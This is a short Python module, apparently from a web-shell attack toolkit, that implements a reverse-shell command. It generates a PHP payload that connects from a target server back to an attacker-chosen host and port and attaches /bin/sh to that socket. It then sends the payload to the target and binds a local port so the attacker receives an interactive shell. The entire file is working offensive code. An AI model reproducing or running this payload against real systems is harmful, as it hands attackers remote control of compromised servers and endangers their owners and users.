from libs.reverse_client_bash import main as bind
from threading import Thread
from libs.config import alias, color, is_windows
from libs.myapp import delay_send


def get_reverse_php(ip, port):
    return """$sock = fsockopen("%s", "%s");
$descriptorspec = array(
        0 => $sock,
        1 => $sock,
        2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);""" % (ip, port)


@alias(True, func_alias="rs", l="lhost", p="port")
def run(lhost: str, port: int):
    """
    shell

    Bind a port and wait for target connect back to get a full shell.
    """
    if (is_windows(False) or is_windows()):
        print(color.red(f"Only for both system is linux."))
        return False
    try:
        port = int(port)
    except ValueError:
        port = 23333
    print(color.yellow(f"Waring: You are using a testing command...."))
    print(color.red(f"        It will behave strange on some Linux!"))
    php = get_reverse_php(lhost, port)
    t = Thread(target=delay_send, args=(2, php))
    t.setDaemon(True)
    t.start()
    print(f"Bind port {color.yellow(str(port))}...\n")
    if (not bind(port)):
        print(color.red(f"Bind port error."))
